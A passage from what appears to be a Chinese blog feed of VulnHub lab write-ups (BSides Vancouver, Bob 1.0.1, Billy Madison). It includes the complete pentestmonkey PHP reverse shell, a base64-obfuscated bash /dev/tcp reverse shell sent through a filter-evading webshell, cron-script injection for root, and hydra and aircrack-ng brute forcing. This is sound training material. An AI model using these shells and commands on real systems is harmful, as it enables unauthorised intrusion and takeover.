pentestmonkey@pentestmonkey.net</span><br><span class="hljs-title function_ invoke__">set_time_limit</span> (<span class="hljs-number">0</span>);<br><span class="hljs-variable">$VERSION</span> = <span class="hljs-string">&quot;1.0&quot;</span>;<br><span class="hljs-variable">$ip</span> = <span class="hljs-string">&#x27;192.168.233.130&#x27;</span>;  <span class="hljs-comment">// You have changed this</span><br><span class="hljs-variable">$port</span> = <span class="hljs-number">443</span>;  <span class="hljs-comment">// And this</span><br><span class="hljs-variable">$chunk_size</span> = <span class="hljs-number">1400</span>;<br><span class="hljs-variable">$write_a</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-variable">$error_a</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-variable">$shell</span> = <span class="hljs-string">&#x27;uname -a; w; id; /bin/sh -i&#x27;</span>;<br><span class="hljs-variable">$daemon</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$debug</span> = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Daemonise ourself if possible to avoid zombies later</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// pcntl_fork is hardly ever available, but will allow us to daemonise</span><br><span class="hljs-comment">// our php process and avoid zombies.  Worth a try...</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;pcntl_fork&#x27;</span>)) &#123;<br><span class="hljs-comment">// Fork and have the parent process exit</span><br><span class="hljs-variable">$pid</span> = <span class="hljs-title function_ invoke__">pcntl_fork</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span> == -<span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;ERROR: Can&#x27;t fork&quot;</span>);<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span>) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">// Parent exits</span><br>&#125;<br><span class="hljs-comment">// Make the current process a session leader</span><br><span class="hljs-comment">// Will only succeed if we forked</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">posix_setsid</span>() == -<span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;Error: Can&#x27;t setsid()&quot;</span>);<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-variable">$daemon</span> = <span class="hljs-number">1</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);<br>&#125;<br><span class="hljs-comment">// Change to a safe directory</span><br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;/&quot;</span>);<br><span class="hljs-comment">// Remove any umask we inherited</span><br><span class="hljs-title function_ invoke__">umask</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Do the reverse shell...</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Open reverse connection</span><br><span class="hljs-variable">$sock</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$port</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$sock</span>) &#123;<br><span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (<span class="hljs-subst">$errno</span>)&quot;</span>);<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-comment">// Spawn shell process</span><br><span class="hljs-variable">$descriptorspec</span> = <span class="hljs-keyword">array</span>(<br><span class="hljs-number">0</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>),  <span class="hljs-comment">// stdin is a pipe that the child will read from</span><br><span class="hljs-number">1</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>),  <span class="hljs-comment">// stdout is a pipe that the child will write to</span><br><span class="hljs-number">2</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)   <span class="hljs-comment">// stderr is a pipe that the child will write to</span><br>);<br><span class="hljs-variable">$process</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-variable">$shell</span>, <span class="hljs-variable">$descriptorspec</span>, <span class="hljs-variable">$pipes</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_resource</span>(<span class="hljs-variable">$process</span>)) &#123;<br><span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-comment">// Set everything to non-blocking</span><br><span class="hljs-comment">// Reason: Occsionally reads will block, even though stream_select tells us they won&#x27;t</span><br><span class="hljs-title function_ invoke__">stream_set_blocking</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">stream_set_blocking</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">stream_set_blocking</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">stream_set_blocking</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;Successfully opened reverse shell to <span class="hljs-subst">$ip</span>:<span class="hljs-subst">$port</span>&quot;</span>);<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><span class="hljs-comment">// Check for end of TCP connection</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$sock</span>)) &#123;<br>    <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;ERROR: Shell connection terminated&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">// Check for end of STDOUT</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;ERROR: Shell process terminated&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">// Wait until a command is end down $sock, or some</span><br><span class="hljs-comment">// command output is available on STDOUT or STDERR</span><br><span class="hljs-variable">$read_a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>]);<br><span class="hljs-variable">$num_changed_sockets</span> = <span class="hljs-title function_ invoke__">stream_select</span>(<span class="hljs-variable">$read_a</span>, <span class="hljs-variable">$write_a</span>, <span class="hljs-variable">$error_a</span>, <span class="hljs-literal">null</span>);<br><br><span class="hljs-comment">// If we can read from the TCP socket, send</span><br><span class="hljs-comment">// data to process&#x27;s STDIN</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$read_a</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;SOCK READ&quot;</span>);<br>    <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$chunk_size</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;SOCK: <span class="hljs-subst">$input</span>&quot;</span>);<br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>], <span class="hljs-variable">$input</span>);&#125;<br><span class="hljs-comment">// If we can read from the process&#x27;s STDOUT</span><br><span class="hljs-comment">// send data down tcp connection</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$read_a</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;STDOUT READ&quot;</span>);<br>    <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$chunk_size</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;STDOUT: <span class="hljs-subst">$input</span>&quot;</span>);<br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>);&#125;<br><span class="hljs-comment">// If we can read from the process&#x27;s STDERR</span><br><span class="hljs-comment">// send data down tcp connection</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-variable">$read_a</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;STDERR READ&quot;</span>);<br>    <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-variable">$chunk_size</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;STDERR: <span class="hljs-subst">$input</span>&quot;</span>);<br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>);&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$sock</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>]);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>]);<br><span class="hljs-title function_ invoke__">proc_close</span>(<span class="hljs-variable">$process</span>);<br><span class="hljs-comment">// Like print, but does nothing if we&#x27;ve daemonised ourself</span><br><span class="hljs-comment">// (I can&#x27;t figure out how to redirect STDOUT like a proper daemon)</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">printit</span> (<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$daemon</span>) &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;<span class="hljs-subst">$string</span>&quot;</span>;&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>这个是我用浏览器的<code>Hack-Tools</code>插件生成的反弹shell的代码，这个插件极力推荐，非常值得使用，功能非常多<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1249697e28c63b9efb401.png"><br>我们修改一个页面代码，然后保存，在本地监听之后去点击这个页面反弹shell<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/cdefe4ef83bea633783bd.png"><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/a8c8072f4a1bc2662f47e.png"></p><h1 id="🛡️-提升权限"><a href="#🛡️-提升权限" class="headerlink" title="🛡️ 提升权限"></a>🛡️ 提升权限</h1><p>反弹到shell后上传我们的辅助提权脚本并执行，然后找到一个我们可写的文件，且是由root用户计划执行的一个可执行文件<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b8237f35a9a13ce03254a.png"><br>我们可以在其中插入bash反弹shell语句<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/856478c182a28787d565d.png"><br>本来一般命令行后面的bash -i就行了，但是不知道为何，我只用bash -i的话无法反弹到shell，后面加了个bash -c后就行了<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/2f2bb349eecce1b6dfb66.png"></p><p>后面查阅了资料发现是脚本默认的是/bin/sh，而sh和bash有一定差距，sh好像也不支持/dev/tcp这样去形成一个tcp连接，如果把第一行的#!/bin/sh改为#!/bin/bash则一切安好</p><h1 id="📖-推荐文章"><a href="#📖-推荐文章" class="headerlink" title="📖 推荐文章"></a>📖 推荐文章</h1><p><a href="https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/">BsidesVancouver下载链接</a><br><a href="https://github.com/LasCC/Hack-Tools">Hack-Tools插件项目地址</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-wp Bob 1.0.1</title>
    <link href="/vulnhub-wp-Bob-1-0-1/"/>
    <url>/vulnhub-wp-Bob-1-0-1/</url>
    
    <content type="html"><![CDATA[<h1 id="🖳-主机发现"><a href="#🖳-主机发现" class="headerlink" title="🖳 主机发现"></a>🖳 主机发现</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo netdiscover -r 192.168.234.0/24<br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/a5481d6693dcb9790d551.png"><br>目标机器是:<strong>192.168.234.47</strong></p><h1 id="👁-服务扫描"><a href="#👁-服务扫描" class="headerlink" title="👁 服务扫描"></a>👁 服务扫描</h1><p>nmap常规扫描端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ sudo nmap -p- -sV 192.168.234.47 --min-rate 10000<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-04 15:13 CST<br>Nmap scan report <span class="hljs-keyword">for</span> bogon (192.168.234.47)<br>Host is up (0.000077s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT      STATE SERVICE VERSION<br>80/tcp    open  http    Apache httpd 2.4.25 ((Debian))<br>25468/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)<br>MAC Address: 08:00:27:C0:CC:74 (Oracle VirtualBox virtual NIC)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 7.69 seconds<br></code></pre></td></tr></table></figure><p>查看web页面，发现只是一个静态页面，查看源码也没有什么其他信息，然后在robots.txt中找到了一些信息<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/f50e44fcfb0ee2323690d.png"><br>一个个访问，发现dev_shell是一个简单的webshell，可以远程执行我们的命令，但是过滤了一些关键字，可以试试base64绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(rightevil㉿kali)-[~/Desktop]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.234.130/1234 0&gt;&amp;1&quot;</span> | <span class="hljs-built_in">base64</span>   <br>L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMjM0LjEzMC8xMjM0IDA+JjEK<br>                                                                                                    <br>┌──(rightevil㉿kali)-[~/Desktop]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMjM0LjEzMC8xMjM0IDA+JjEK&quot;</span> | <span class="hljs-built_in">base64</span> -d | bash<br></code></pre></td></tr></table></figure><p>将第二条命令复制去webshell执行，同时在本地启动监听</p><h1 id="🚪🚶-获取权限"><a href="#🚪🚶-获取权限" class="headerlink" title="🚪🚶 获取权限"></a>🚪🚶 获取权限</h1><p>成功反弹到一个shell，我们可以用python尝试一下扩展一个交互性高一些的shell（如果有python的话）</p><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/682c80c1209b9225cff43.png"></p><p>通过查找，我们找到了一个密码文件以及一个gpg加密的文件<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1fe839cc4c416c8bfcdba.png"><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/aee07719a02513829fede.png"><br>在Secret目录下，有一个可以运行的脚本，我们可以用他的首字母来组成一个密码<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/3167f62e2e59daaded6df.png"><br>(根据之前web的一个页面来看)<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/9641f18628635ddff83c3.png"><br>但是我们无法用www-data去解密这个文件，我们用ssh登上其他用户，然后去解密</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">seb@Milburg-High:/home/bob/Documents$ gpg -d login.txt.gpg<br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/6b8fba82a03a28289357c.png"><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/3d2a135613b833a2aa586.png"></p><h1 id="🛡️-提升权限"><a href="#🛡️-提升权限" class="headerlink" title="🛡️ 提升权限"></a>🛡️ 提升权限</h1><p>然后我们登上bob</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">seb@Milburg-High:/home/bob/Documents$ su bob<br>Password: <br>bob@Milburg-High:~/Documents$ sudo -l<br>sudo: unable to resolve host Milburg-High<br>[sudo] password <span class="hljs-keyword">for</span> bob: <br>Matching Defaults entries <span class="hljs-keyword">for</span> bob on Milburg-High:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User bob may run the following commands on Milburg-High:<br>    (ALL : ALL) ALL<br>bob@Milburg-High:~/Documents$ <span class="hljs-built_in">id</span><br>uid=1001(bob) gid=1001(bob) <span class="hljs-built_in">groups</span>=1001(bob),27(sudo)<br></code></pre></td></tr></table></figure><p>发现有很大的sudo权限，我们直接用sudo提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">bob@Milburg-High:~/Documents$ sudo bash<br>sudo: unable to resolve host Milburg-High<br>root@Milburg-High:/home/bob/Documents<span class="hljs-comment"># whoami</span><br>root<br>root@Milburg-High:/home/bob/Documents<span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br>root@Milburg-High:/home/bob/Documents<span class="hljs-comment"># cd /</span><br>root@Milburg-High:/<span class="hljs-comment"># cat flag.txt </span><br>CONGRATS ON GAINING ROOT<br>        .-.<br>       (   )<br>        |~|       _.--._<br>        |~|~:<span class="hljs-string">&#x27;--~&#x27;</span>      |<br>        | | :   <span class="hljs-comment">#root   |</span><br>        | | :     _.--._|<br>        |~|~`<span class="hljs-string">&#x27;--~&#x27;</span><br>        | |<br>        | |<br>        | |<br>        | |<br>        | |<br>        | |<br>        | |<br>        | |<br>        | |<br>   _____|_|_________ Thanks <span class="hljs-keyword">for</span> playing ~c0rruptedb1t<br>root@Milburg-High:/<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h1 id="📖-推荐文章"><a href="#📖-推荐文章" class="headerlink" title="📖 推荐文章"></a>📖 推荐文章</h1><p><a href="https://www.vulnhub.com/entry/bob-101,226/">Bob 1.0.1下载</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-wp Billy Madison</title>
    <link href="/vulnhub-wp-Billy-Madison/"/>
    <url>/vulnhub-wp-Billy-Madison/</url>
    
    <content type="html"><![CDATA[<h1 id="🖳-主机发现"><a href="#🖳-主机发现" class="headerlink" title="🖳 主机发现"></a>🖳 主机发现</h1><p>熟悉的netdiscover -r</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">─$ sudo netdiscover -r 192.168.234.0/24<br> Currently scanning: Finished!   |   Screen View: Unique Hosts                                <br> 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                   <br> _____________________________________________________________________________<br>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      <br> -----------------------------------------------------------------------------<br> 192.168.234.45  00:0c:29:1f:87:52      1      60  VMware, Inc.                                    <br> 192.168.234.196 20:1e:88:ad:<span class="hljs-built_in">fc</span>:55      1      60  Intel Corporate                                 <br> 192.168.234.177 c6:62:32:b7:68:66      1      60  Unknown vendor  <br></code></pre></td></tr></table></figure><p>目标机器是<strong>192.168.134.45</strong></p><h1 id="👁-服务扫描"><a href="#👁-服务扫描" class="headerlink" title="👁 服务扫描"></a>👁 服务扫描</h1><p>使用nmap对其进行扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -p- 192.168.234.45 --min-rate 8000 <br></code></pre></td></tr></table></figure><ul><li>–min-rate 设置最小发包速度为8000，在靶场环境可以快速扫描出结果<blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/c84b44e68c831d5bb6b28.png"></p></blockquote></li></ul><h1 id="🚪🚶-获取权限"><a href="#🚪🚶-获取权限" class="headerlink" title="🚪🚶 获取权限"></a>🚪🚶 获取权限</h1><p>一个个探测，经过尝试，smb服务中有一个txt文件，里面提示我们eric的后门以及关闭了。</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/41c0b0d2d7080a15873d5.png"></p></blockquote><p>23端口用telnet连接后，给了我们一个提示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">telnet 192.168.234.45 23<br>***** HAHAH! You<span class="hljs-string">&#x27;re banned for a while, Billy Boy!</span><br><span class="hljs-string">By the way, I caught you trying to hack my wifi - but the joke&#x27;</span>s on you!<br>I don<span class="hljs-string">&#x27;t use ROTten passwords like rkfpuzrahngvat anymore!</span><br><span class="hljs-string">Madison Hotels is as good as MINE!!!! *****</span><br></code></pre></td></tr></table></figure><p>这里给了一个rot13加密的一个字符串</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/997d24edcb9e3cfef5ae6.png"></p></blockquote><p>经过尝试后，这个解密后的字符串是一个web页面的路径<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/5243bfc663b470d9c8a89.png"><br>从这个页面我们可以得到的信息有：</p><ul><li>veronica使用她的名字作为密码</li><li>有一个流量文件在这个路径下，也使用的和veronica相关的名字</li></ul><p>那我们先得到一个关于veronica的字典</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /usr/share/wordlists/rockyou.txt | grep veronica &gt; pass.txt<br></code></pre></td></tr></table></figure><p>使用dirbuster进行爆破</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/4b9c05d1b0f0b5aa6a888.png"><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/45f9abdf33ba98f49b30b.png"></p></blockquote><p>从这个流量文件中，我们可以分析出俩个重要信息</p><ul><li>eric在机器上有一个ftp账号</li><li>该机器的ftp使用了knock服务，需要以一个特定序列进行”敲门”后才会开放</li></ul><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/bc03ac5169c435d246ee1.png"><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1e959b7602674464eb0eb.png"><br>注：<a href="https://www.cnblogs.com/f-carey/p/16066178.html"><em>knock服务科普</em></a><br>无需多言，我们敲门<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b2ff23ee2f283b123522e.png"><br>注：<strong>若是登录ftp的时候报错有关passive的话先输入<code>passive</code>命令进入passive mode</strong></p><p>登录上ftp服务器后，在eric的目录下找到一个.note文件，里面记载了一个后门的打开方法，以及eric的ssh密码在veronica或者billy的目录下。我们爆破一下veronica的ftp试试<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/6f4ea2dfef3d76ccca876.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l veronica -P pass.txt 192.168.234.45 ftp<br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/a8e6e8d7b87302c45e098.png"><br>登录上veronica后，我们可以找到一个eml文件和一个cap流量文件，把他下载下来分析一下后发现流量是wifi流量，邮件中也提到了这一点。而wifi的密码就是eric的ssh密码<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b33e1302ba9bb532d6706.png"><br>那我们用aircrack-ng爆破一下wifi密码试试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aircrack-ng eg-01.cap -w /usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1e955d89673ed3fb7af75.png"><br>在爆破的同时，我们也发送一下邮件，激活后门</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">telnet 192.168.234.45 2525<br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/01df918eb7c3f46a0f9b2.png"><br>现在我们再进行一个nmap扫描，查看是否有新的服务开启</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -p- -sV 192.168.234.45 --min-rate 10000<br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/ca57562e6a420ca63a14f.png"><br>我们可以使用<strong>eric:triscuit*</strong> 去ssh连接</p><h1 id="🛡️-提升权限"><a href="#🛡️-提升权限" class="headerlink" title="🛡️ 提升权限"></a>🛡️ 提升权限</h1><p>我们在本地开启python的web服务，然后在靶机上用wget下载辅助提权脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">kali:<br>python3 -m http.server 80<br><br>eric@BM:/tmp$ wget http://192.168.234.130/linpeas.sh<br>--2023-12-03 06:56:14--  http://192.168.234.130/linpeas.sh<br>Connecting to 192.168.234.130:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 847815 (828K) [text/x-sh]<br>Saving to: ‘linpeas.sh’<br><br>linpeas.sh   